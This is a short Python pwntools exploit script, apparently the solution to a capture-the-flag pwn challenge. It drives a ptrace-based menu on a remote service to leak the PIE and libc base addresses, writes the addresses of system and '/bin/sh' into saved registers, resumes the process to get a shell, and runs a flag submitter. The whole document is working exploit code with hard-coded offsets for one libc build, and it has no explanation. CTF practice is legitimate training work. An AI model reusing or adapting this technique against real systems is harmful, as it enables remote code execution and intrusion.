from pwn import *

context.update(arch='amd64', os='linux')
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))

# r = process("./handout/challenge")

PTRACE_CONT = 7
PTRACE_SETREGS = 13
PTRACE_PEEKDATA = 2

PTRACE_PEEKUSER = 3

r.sendline("3")
r.sendline(str(8))
r.sendline(str(0))

r.recvuntil("returned ")
pie = int(r.recvline(), 16) - 0x3d68
r.sendline("1")
print(hex(pie))

r.sendline("2")
r.sendline(hex(pie + 0x0000000000003F80))
r.sendline(hex(0))

r.recvuntil("returned ")
libc = int(r.recvline(), 16) - 0x80ed0
system = libc + 0x50d60
binsh = libc + 0x1d8698
r.sendline("1")
print(hex(libc))

r.sendline("6")
r.sendline(hex(16*8))
r.sendline(hex(system))
r.sendline("1")

r.sendline("6")
r.sendline(hex(14*8))
r.sendline(hex(binsh))
r.sendline("1")

r.sendline("7")
r.sendline("0")
r.sendline("0")

r.sendline("ls")
r.sendline("./submitter")
print(r.recvuntil("}"))

r.close()
